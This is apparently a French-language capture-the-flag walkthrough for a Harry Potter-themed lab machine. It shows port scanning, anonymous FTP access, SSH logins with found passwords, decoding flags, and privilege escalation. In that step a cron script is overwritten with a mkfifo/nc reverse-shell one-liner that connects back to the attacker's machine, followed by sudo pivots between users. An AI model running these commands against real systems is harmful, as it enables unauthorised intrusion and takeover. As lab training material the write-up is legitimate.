
ip machine a attaqueé : 10.10.112.42

ping 10.10.112.42
=> notre vm connecté a celle a attaqué

nmap -vv 10.10.112.42 -p-
=> 21 et 22
=> 21 pour transfert de fichier
=> voir si connection ftp possible (file transfert protocole)

connection ftp:
ftp "ip machine"

src :https://stackoverflow.com/questions/3936911/how-can-i-login-anonymously-with-ftp-usr-bin-ftp
user:anonymous
password:anonymous@domain.com

dans ftp:
ls -a
faire recv .hidden
puis cd ...
recv .reallyHidden
exit

cat .hidden & .reallyHidden

ensuite connection ssh
ssh hagrid@ipmachine

mdp = IAlreadySaidTooMuch

cat user.txt

go to https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')&input=Vld4YVExTnRWalpSYmxaT1RWUnNlVmRXVlRGYWJVcHhWR3BLVGsxVmNHMVpWV1JIVmpBd2VFOUljR2xoYTBwWFZERldiMXByTlZWUmExSlVaV3R2TlZFeVl6bFFVVDA5
select magic
mettre le hash dans magic
VWxaQ1NtVjZRblZOTVRseVdWVTFabUpxVGpKTk1VcG1ZVWRHVjAweE9IcGlha0pXVDFWb1prNVVRa1JUZWtvNVEyYzlQUT09
===> EPI{0n3_kaN_n3v3R_haV3_3n0U9H_50CK2}

faire cat /etc/crontab

cp hut.sh hut.sh.bak

dans un autre terminal sur la machine kali : nc -nlvp [port]

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip machine kali] [port] >/tmp/f" > hut.sh
sudo -l
sudo /sbin/reboot
puis attendre

reverse shell est connecté en tant que hagrid
sudo -u hermione /bin/sh

connecté as hermione

cat dumbledore.txt
e1f22cea2a1c41f047b36b505a6aede84a848209c69505ac17ffdaebd7ba63c98e69f68f755134d7b94d47d0c86c1aea72f39fa4e89457cf8b25f19cd1b2dd33
3984d0b5033258950d886bc760a867399e57d8cc396c74beeaefc51168ccc7d11369e882d2e591619c42192102d550fdebb59db528f88bb46cc1a33a30b0ec0a
1f4be9bd3c61e621ef43bb2e0a2d7836786f730e4e0e6aa546899bceab0571904dfc6efc94c1324b1a22ae446f0a995b533054b1dbd09d0cda03e0985786d59a
c9f4875d9269814e2ddf825ce769cb77702034225818d8cad8d46c6483693fa28b8d4e3e053d1facbd774b1fc5a2b4cc31ef41a1129e58fc149d383dc2f1b647
e75baca2466b6805bdcfc52a12160ffaaf05677dd947c5b3019710d43ea18010fcb6c9ec0cde94efcb23a68bf9c7595798e77f4ff0602f468377d15392465b69
de6bcbd90ff00c604a836fe2a0959c6a86aeabd440d8982970613edff3cd27996cd4a21c005e4dd4dca89c9a5d7a46fa9d97d2b220521dddf3b376fd04f2d0ba
7afc42427607f5171b9db17b38c3953ad5e614955cedbba9cfb97a276f3f3bd83fcfe61bdbfc799ca83865e446f3ae47998a624fd7316e7e56f7b27c9d67f150
263adce0f04ee1eb3e75528ed5251724906bdd44c4265a1cd1185af010a4561e153833d1ea46df69764f2ece8e33199f8d787bf39cc51ebb406f15480c7e780e
7f5a8bf8b1779e4802c8e86dd1ea8e096be633d64eb8b5610ae9267af670734de1bf740427d05d454f5d4080aedf2b0821c1f338cd507e9b0dc9a0145bbff303
806b977f3edfeda024f63584cc232c7b53ca0bba09cf9818346070f6489e775232f19d33390a78ba14f301a41a0c6994c2f7d95be6f6faeff9243f8e38c131f7
1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75
c9f4875d9269814e2ddf825ce769cb77702034225818d8cad8d46c6483693fa28b8d4e3e053d1facbd774b1fc5a2b4cc31ef41a1129e58fc149d383dc2f1b647
b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86
496e20666163742c2074686973207761732073696d706c652c207472756c792c207468652070617373776f72642069732042794d65726c696e4265617264210a

retour dans hagride
sudo -u dumbledore
mdp = ByMerlinBeard!
ssh harry@10.10.52.179 -i /home/harry/.ssh/id_rsa

connected as harry

cat /etc/sudoers.d/harry
find strawgoh

sudo -h strawgoh /bin/bash
cd /root/
cat root.txt
magic wizard
53565a4a52564d324d315648546b56474e6a564455303957533064525746705353314a5156454e4f537a6448556c425555553161565539574d6b5244576c4e57536c4a5156456b7a5530564d4e544a45527a5255553064464e45565a5454493354314a5652454d7a556c705156555a425054303950513d3d
EPI{t3H_tRuTh_1T_15_4_834ut1fUL_4nD_t3rr18L3_th1n9}
